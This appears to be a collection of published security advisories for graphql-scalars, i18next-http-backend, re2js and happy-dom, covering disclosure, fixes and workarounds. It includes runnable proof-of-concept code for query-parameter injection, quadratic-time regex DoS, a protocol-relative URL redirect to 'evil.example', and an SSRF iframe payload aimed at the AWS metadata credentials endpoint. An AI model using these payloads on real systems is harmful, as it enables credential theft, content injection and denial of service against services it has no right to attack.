  • every sequence of up to 6 tokens from 1 11 111 1111 11111 + - space ( ) x: 1,948,717 strings (100,380 accepted), 0 differences;
  • adversarial inputs (digit runs plus a failing character, digit/space and digit/dash alternations, parenthesis variants) scale linearly: 1,000,000 characters take about 10 ms, where the current pattern needs 0.3 s for 26.

Optionally also reject values above a sane length before matching; the grammar currently has no upper bound and E.164 allows at most 15 digits. Above roughly 10 million characters V8 aborts the match with a RangeError (stack) after about 25 ms instead of returning false.

A regression test that fails with the current implementation: GraphQLPhoneNumber.parseValue('1'.repeat(40) + 'x') must throw its validation error immediately; with the current pattern it does not return in any reasonable time.

Workarounds for users until a fix is released

  • Replace the scalar in the schema with one that uses the pattern above.
  • Run Node with --enable-experimental-regexp-engine-on-excessive-backtracks, or call v8.setFlagsFromString('--enable-experimental-regexp-engine-on-excessive-backtracks') before the regex first runs. V8 then falls back to its linear-time engine after excessive backtracking; verified on Node 22.19, 24.15 and 26.10. The flag is not accepted in NODE_OPTIONS.
  • Pinning graphql-scalars to <= 1.24.0 restores a linear pattern but changes which values are accepted (only + prefixed E.164).

Coordination

We have not disclosed this publicly. We maintain Unchained Engine (@unchainedshop/api), a downstream project that exposes this scalar on public input fields and will need to ship a mitigation of its own, so we would like to coordinate the timing of any public disclosure with you. Please let us know your preferred timeline, and whether you would like us to prepare a pull request (we can work in a temporary private fork if you enable one).

References

  • https://github.com/graphql-hive/graphql-scalars/security/advisories/GHSA-x8rm-f576-gq67
  • https://nvd.nist.gov/vuln/detail/CVE-2026-115887
  • https://github.com/graphql-hive/graphql-scalars/pull/2719
  • https://github.com/graphql-hive/graphql-scalars/commit/210fd2485641afa2452800c00144245c74361701
  • https://github.com/graphql-hive/graphql-scalars/releases/tag/v2.0.1
  • https://github.com/advisories/GHSA-x8rm-f576-gq67

entry.title: [i18next-http-backend] i18next-http-backend: Query-parameter injection through & and = in lng when loadPath/addPath puts {{lng}} in the query string
entry.content:
Summary

The URL-segment check added for GHSA-q89c-q3h5-w34g blocks ?, #, %, :, / and @ in lng, but not & or =, and the checked value is inserted into the URL without encoding. The README documents a multiload loadPath of the form /locales/resources.json?lng=de+en&ns=ns1+ns2. With a template like that, an attacker who controls the language value can add or override query parameters on the request the backend sends. By default the language comes from ?lng=, a cookie or Accept-Language. This is the "query-string injection" impact described in GHSA-q89c; only the ? form was closed.

Server side (Express + i18next-http-middleware, default options), GET /?lng=de%26ns%3Dprivate%26admin%3Dtrue makes the application request …?lng=de&ns=private&admin=true&ns=common from its own translations API.

Details

The checks are in lib/utils.js. The base check (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/utils.js#L26-L44) rejects:

  • empty or >128-character values and prototype keys;
  • .. and \;
  • /[?#%:\s]/;
  • control characters.

isSafeLangUrlSegment (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/utils.js#L51-L55) adds only / and @. Neither function rejects & or =.

if (/[?#%:\s]/.test(v)) return false   // utils.js L40, no & or =

interpolateUrl then splits on +, checks each segment, and joins the raw segments into the template, with no encoding (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/utils.js#L159-L184, return at L174).

Call sites:

  • _readAny builds the load URL with interpolateUrl(resolvedLoadPath, { lng: languages.join('+'), ns: … }): https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/index.js#L64
  • create builds the missing-key URL with interpolateUrl(addPath, { lng, ns }): https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/index.js#L133

The README documents the query-shaped URL for multiloading (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/README.md?plain=1#L130). The language value is attacker-controlled in normal setups, as GHSA-q89c itself says: detectors read ?lng=, cookies, localStorage and request headers. i18next-http-middleware's LanguageDetector does the same on the server.

Where ? is placed in the template determines which characters are structural. The fix treated only the path position. In a query position, & and = are the separators, so they must be rejected or encoded too.

Suggested fix. Reject & and = (and ;) in both lng and ns; no BCP-47 language code or usable i18next namespace contains them. Alternatively, encodeURIComponent each +-joined segment when the placeholder appears after ? in the template.

Proof of concept

How to run (Node 18+; everything runs on 127.0.0.1, with a fake translations API and an Express app):

  1. mkdir i18next-poc && cd i18next-poc
  2. npm init -y
  3. npm i i18next@26.5.1 i18next-http-backend@4.0.3 i18next-http-middleware@3.9.9 express@5.3.0
  4. Save the script below as poc.mjs
  5. node poc.mjs
// i18next-http-backend 4.0.3: '&' and '=' in lng pass isSafeLangUrlSegment, so a loadPath that puts
// {{lng}} in the query string (README multiload shape) gets extra parameters.
// Everything runs on 127.0.0.1: a fake translations API and an Express app.
import http from 'node:http'
import express from 'express'
import i18next from 'i18next'
import Backend from 'i18next-http-backend'
import middleware from 'i18next-http-middleware'

const seen = []
const api = http.createServer((req, res) => {
  seen.push(req.url)
  res.setHeader('content-type', 'application/json')
  res.end('{"hello":"hi"}')
})
await new Promise((r) => api.listen(0, '127.0.0.1', r))
const loadPath = `http://127.0.0.1:${api.address().port}/locales/resources.json?lng={{lng}}&ns={{ns}}`
const wait = () => new Promise((r) => setTimeout(r, 200))

// 1) Direct: lng values passed to i18next as-is.
console.log('[1] direct init')
for (const lng of ['de', 'de?admin=true', 'de&ns=private&admin=true']) {
  seen.length = 0
  await i18next.createInstance().use(Backend).init({ lng, fallbackLng: false, ns: ['common'], backend: { loadPath } })
  console.log(`    lng=${JSON.stringify(lng).padEnd(28)} -> API got: ${seen.length ? seen.join(' ') : '(no request, refused)'}`)
}

// 2) Server side: language taken from the request by i18next-http-middleware (default options).
console.log('[2] Express + i18next-http-middleware LanguageDetector')
const i18n = i18next.createInstance()
await i18n.use(Backend).use(middleware.LanguageDetector)
  .init({ fallbackLng: 'en', preload: ['en'], ns: ['common'], defaultNS: 'common', backend: { loadPath } })
const app = express()
app.use(middleware.handle(i18n))
app.get('/', (req, res) => res.send(req.t('hello')))
const web = app.listen(0, '127.0.0.1')
await new Promise((r) => web.on('listening', r))
await wait()
for (const q of ['de', 'de%26ns%3Dprivate%26admin%3Dtrue']) {
  seen.length = 0
  await fetch(`http://127.0.0.1:${web.address().port}/?lng=${q}`).then((r) => r.text())
  await wait()
  console.log(`    GET /?lng=${q.padEnd(32)} -> API got: ${seen.join(' ')}`)
}
web.close()
api.close()

Output (i18next-http-backend 4.0.3, i18next 26.5.1, i18next-http-middleware 3.9.9, Node 22):

[1] direct init
    lng="de"                         -> API got: /locales/resources.json?lng=de&ns=common
    lng="de?admin=true"              -> API got: (no request, refused)
    lng="de&ns=private&admin=true"   -> API got: /locales/resources.json?lng=de&ns=private&admin=true&ns=common
[2] Express + i18next-http-middleware LanguageDetector
    GET /?lng=de                               -> API got: /locales/resources.json?lng=de&ns=common
    GET /?lng=de%26ns%3Dprivate%26admin%3Dtrue -> API got: /locales/resources.json?lng=de&ns=private&admin=true&ns=common

The ? control is refused by the existing fix. The & form passes and reaches the API with injected ns=private&admin=true.

Impact

This is injection of query parameters (CWE-74, HTTP parameter pollution) into the backend's outgoing requests:

  • Server side (SSR, Node, i18next-http-middleware): an unauthenticated visitor can make the application server send requests to its internal or partner translations API with parameters of the visitor's choosing. The visitor can override existing ones (ns, version, tenant, feature flags, cache keys) using the server's network position and credentials. Depending on how that API branches on its parameters, this can expose other namespaces or tenants' resources, or change server-side behaviour.
  • Browser side: a crafted link (?lng=…) does the same to the victim's same-origin request.

Applications using the default path template /locales/{{lng}}/{{ns}}.json, or a supportedLngs allowlist, are not affected.

credit to Adrian Korwel.

Maintainer note

Confirmed and fixed in 4.0.4 (commit i18next/i18next-http-backend@b0eef9e).

Preconditions. The loadPath / addPath template must put {{lng}} or {{ns}} in the query string (for example /locales/resources.json?lng={{lng}}&ns={{ns}}, the multiload shape), and the attacker must control the language or namespace value. The default /locales/{{lng}}/{{ns}}.json and other path-only templates are not affected, nor are applications that restrict languages with supportedLngs. The impact depends on what the translations API does with the injected parameters.

Fix. &, = and ; are now rejected in both lng and ns values, in addition to the ?, #, % and : rejected before. No language code or usable namespace name contains them. +-joined multiload values such as de+en keep working, verified end to end with i18next-multiload-backend-adapter.

Affected range. Versions before 3.0.5 had no value validation at all and are reachable through this vector too, so the affected range is < 4.0.4.

Related. i18next-locize-backend had the same gap with custom query-shaped templates (its default paths are not affected). It is fixed in i18next-locize-backend 10.0.4.

References

entry.title: [re2js] RE2JS: Quadratic-time denial of service in re2js lookbehind matching
entry.content:
Summary

Using the opt-in LOOKBEHINDS flag together with any repeated-matching API (matcher().find() in a loop, matchAll(), split(), matcher().replaceAll()) causes quadratic-time (Θ(n²)) matching, contradicting the library's own "linear time matching" guarantee. A single call with a 16,000-character input takes 36.7–38.7 seconds of CPU.

Description

Root cause

In build/index.cjs, Machine.match:

let currentPos = this.prog.numLb > 0 ? 0 : pos;   // ~line 1907
...
if (this.ncap === 0 && this.matched) break;        // ~line 1953

Any pattern containing a lookbehind sets prog.numLb > 0, which forces the scan to always restart at offset 0, regardless of the requested start position — the lookbehind automaton is re-seeded and the whole input is re-walked on every single find() call. The early-exit optimization that would otherwise stop at the first match only fires when ncap === 0, but every Matcher-based API (find/matchAll/split/replaceAll) always requests ncap = 2 (one capture group slot) even for a captureless lookbehind pattern — so the early exit never triggers through those APIs, and the scan continues to the end of the input on every find.

A find-loop over k matches in an n-character string therefore costs k × Θ(n); for dense matches k ∝ n, giving Θ(n²) total.

Isolating control

Identical find-loop, identical input sizes, same 2-character literal pattern shape — but without the LOOKBEHINDS flag:

n with LOOKBEHINDS (lookbehind pattern) without (plain literal) native JS RegExp lookbehind
2,000 204–228 ms 3 ms 0 ms
4,000 877–899 ms 4 ms 0 ms
8,000 5,746–6,599 ms 7 ms 1 ms
16,000 36,667–38,732 ms 6 ms 1 ms

This isolates the lookbehind machinery itself — not pattern length, not match density in the abstract — as the exact and sole cause.

Impact

  • re2js's entire value proposition is being an RE2-style engine with linear-time, no-backtracking matching, specifically to resist algorithmic-complexity attacks that plague backtracking regex engines. This finding defeats that guarantee for any consumer using the advertised LOOKBEHINDS feature.
  • Realistic affected code paths: log/text processing that tokenizes or redacts using a lookbehind-based pattern (matchAll, split, replaceAll are the natural APIs for exactly this), applied to attacker-influenced text (user input, uploaded logs, scraped content).
  • A single ~16–32 KB request pins a CPU core for tens of seconds to minutes; Node.js being single-threaded, this freezes the whole worker process for the duration. No authentication or special pattern knowledge is required from the attacker — ordinary alternating text ("abababab...") triggers it.

Reproduction (copy-paste runnable)

create file poc.js

'use strict';
// PoC: quadratic-time DoS in re2js's lookbehind matching (opt-in LOOKBEHINDS flag).
// Usage:
//   npm pack re2js@2.8.6 --ignore-scripts && tar -xzf re2js-2.8.6.tgz
//   node poc.js ./package
const path = require('path');
const pkgDir = process.argv[2] || './package';
const { RE2JS } = require(path.resolve(pkgDir, 'build/index.cjs'));

const re = RE2JS.compile('(?<=a)b', RE2JS.LOOKBEHINDS);

function timeFindLoop(n) {
  const s = 'ab'.repeat(n / 2);
  const t0 = Date.now();
  const m = re.matcher(s);
  let count = 0;
  while (m.find()) count++;
  return { ms: Date.now() - t0, count };
}

console.log('n, matches, ms');
const sizes = [2000, 4000, 8000, 16000];
const results = [];
for (const n of sizes) {
  const r = timeFindLoop(n);
  results.push(r.ms);
  console.log(`${n}, ${r.count}, ${r.ms}`);
}

const ratio = results[results.length - 1] / results[results.length - 2];
console.log('');
console.log('time ratio for the last doubling of n:', ratio.toFixed(2), '(~2 => linear, ~4 => quadratic)');
console.log(ratio > 3 ? 'PASS  quadratic scaling confirmed on the REAL published package' : 'FAIL  scaling looks linear');
process.exit(ratio > 3 ? 0 : 1);

and run in terminal

npm pack re2js@2.8.6 --ignore-scripts
tar -xzf re2js-2.8.6.tgz
node poc.js ./package

poc.js times a matcher(s).find() loop over (?<=a)b + RE2JS.LOOKBEHINDS on inputs of 2,000/4,000/8,000/16,000 chars and reports the doubling ratio. Expected: clearly superlinear (ratio ≫ 2, approaching or exceeding the 4× quadratic signature), reaching tens of seconds at 16,000 chars. Run twice; results are deterministic.

  • https://nvd.nist.gov/vuln/detail/CVE-2026-116795

entry.title: [i18next-http-backend] i18next-http-backend: Namespace value starting with / forms a protocol-relative URL when loadPath/addPath places {{ns}} right after a / (bypass of the // check added for GHSA-xvq9-wjp8-hwqf)
entry.content:
Affected versions

Verified on 4.0.2 (latest on npm) and on commit 07e0288 (the GHSA-xvq9-wjp8-hwqf fix). Earlier 3.x/4.x versions that allow / in ns are likely affected too. Not verified on them.

Impact

Same class as GHSA-xvq9-wjp8-hwqf and GHSA-q89c-q3h5-w34g: when an attacker controls the namespace value, the request goes to an attacker-chosen origin. In a browser this loads attacker-controlled translation JSON (content injection into the UI, and XSS where translations are rendered as HTML). The precondition is a template with {{ns}} right after a leading /, for example /{{ns}}/{{lng}}.json. The 4.0.2 maintainer note says templates with a leading / are safe. This case is outside that statement.

Root cause

isSafeNsUrlSegment rejects any ns containing //, but allows a single leading / (needed for nested namespaces like a/b). Interpolation into /{{ns}}/... puts the template's own / next to the value's /. The result starts with //, which is a protocol-relative URL. The check runs on the value, not on the final URL.

Minimal PoC

import Backend from 'i18next-http-backend'
const b = new Backend(null, { loadPath: '/{{ns}}/{{lng}}.json',
  request: (opts, url, payload, cb) => { console.log(url, '->', new URL(url, 'https://app.example/').origin); cb(null, { status: 200, data: '{}' }) } })
b.read('en', '/evil.example', () => {})

Observed on 4.0.2:

POC ns=/evil.example  loadPath=/{{ns}}/{{lng}}.json => url=//evil.example/en.json  origin in page https://app.example/ = https://evil.example

Negative controls (same run)

  • ns //evil.example: rejected ("unsafe lng/ns value").
  • lng http:127.0.0.1:9 (the GHSA-xvq9 payload): rejected.
  • ns common and nested ns a/b: common/en.json and a/b/en.json, same origin.

Suggested fix

Validate the final interpolated URL, not just the values: reject it if it starts with // or \, or if it has a scheme or host the template did not have. The advisory already recommends this ("parse the final URL and require it to remain within the intended origin and path"). Alternatively, reject an ns that starts with /.

Disclosure

We intend to keep this private for 90 days from the date of the report, or until a fixed release is available, whichever comes first, and are happy to adjust if you need more time.

Re-verification

Re-run on 2026-10-14 against the same latest release. The PoC still reproduces and the negative controls still hold.

Reported by Zachariah Mithani.

Maintainer note

Confirmed and fixed in 4.0.3 (commit i18next/i18next-http-backend@042c3d4).

Preconditions. The loadPath / addPath template must put {{ns}} directly after a leading / (for example /{{ns}}/{{lng}}.json), and the attacker must control the namespace value. Applications usually set namespaces in code rather than from user input. The default /locales/{{lng}}/{{ns}}.json, templates with an origin, and templates with a fixed path segment before {{ns}} are not affected. Only browsers are affected: in Node, fetch('//host/...') fails because there is no base URL to resolve against. XSS additionally requires the application to render translations as HTML.

Fix. The 4.0.2 // check looked at each value on its own and could not see the / the template puts in front of it. interpolateUrl now also checks the interpolated URL: it may only start with // or \ if the template itself does. Protocol-relative CDN templates such as //cdn.example/{{lng}}/{{ns}}.json keep working.

Affected range. Versions before 3.0.5 had no value validation at all and are reachable through this vector too, so the affected range is < 4.0.3.

Related. i18next-fs-backend had the same class of problem for file paths (a leading / in ns, or C: in lng, changing the root of a path built from a template that starts with the placeholder). It is fixed in i18next-fs-backend 2.6.9.

entry.title: [happy-dom] Happy DOM: SSRF via iframe and link stylesheet when parsing untrusted HTML
entry.content:
Summary

happy-dom v20.8.9 makes real server-side HTTP requests to arbitrary URLs when parsing HTML containing <iframe> or <link rel="stylesheet"> elements. This behavior is enabled by default (disableIframePageLoading: false, disableCSSFileLoading: false). When an application uses happy-dom to parse untrusted HTML on the server side, an attacker can trigger Server-Side Request Forgery by embedding these elements.

Affected Versions

  • happy-dom <= 20.8.9 (latest)

Vulnerable Behavior

By default, happy-dom has:

  • disableIframePageLoading: false — iframes fetch their src URL via real HTTP requests
  • disableCSSFileLoading: false — <link> stylesheets fetch their href URL via real HTTP requests

When untrusted HTML is parsed, these elements trigger real server-side HTTP requests to whatever URLs are specified. No special configuration or opt-in is needed.

Proof of Concept

Verified test (attacker server receives requests):

const http = require('http');
const { Window } = require('happy-dom');

// Start attacker server
const srv = http.createServer((req, res) => {
    console.log(`SSRF HIT: ${req.method} ${req.url}`);
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('<html><body>stolen</body></html>');
});

srv.listen(9995, () => {
    // iframe SSRF — happy-dom makes a real GET request
    const win1 = new Window({ url: 'http://localhost' });
    win1.document.write('<html><body><iframe src="http://127.0.0.1:9995/iframe-ssrf"></iframe></body></html>');

    // stylesheet SSRF — happy-dom makes a real GET request
    const win2 = new Window({ url: 'http://localhost' });
    win2.document.write('<html><head><link rel="stylesheet" href="http://127.0.0.1:9995/stylesheet-ssrf"></head><body></body></html>');
});

Test output:

SSRF HIT: GET /iframe-ssrf
SSRF HIT: GET /stylesheet-ssrf

Both requests confirmed received by the attacker server. Tested on happy-dom v20.8.9, Node.js v22.17.0, macOS.

Cloud metadata attack scenario:

const { Window } = require('happy-dom');
const win = new Window({ url: 'http://localhost' });

// Attacker-controlled HTML triggers fetch to AWS metadata endpoint
win.document.write('<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe></body></html>');

Impact

  • Cloud credential theft — <iframe src="http://169.254.169.254/..."> fetches AWS/GCP/Azure metadata
  • Internal network scanning — probe internal services and ports
  • Data exfiltration — read responses from internal APIs
  • Affects any server-side use case — web scraping, email HTML rendering, SSR, testing with external HTML input

Suggested Fix

Change defaults to disable external resource loading:

disableIframePageLoading: true,  // change from false
disableCSSFileLoading: true,     // change from false

Or add URL validation to block private IP ranges and cloud metadata endpoints before fetching.

References

  • https://github.com/capricorn86/happy-dom/security/advisories/GHSA-c8p4-j97h-3vg8
  • https://github.com/capricorn86/happy-dom/pull/2502
  • https://github.com/capricorn86/happy-dom/commit/0a99c7525a1d0043e3182843ae33466ab7b19e74
  • https://github.com/capricorn86/happy-dom/releases/tag/v21.0.0
  • https://github.com/advisories/GHSA-c8p4-j97h-3vg8
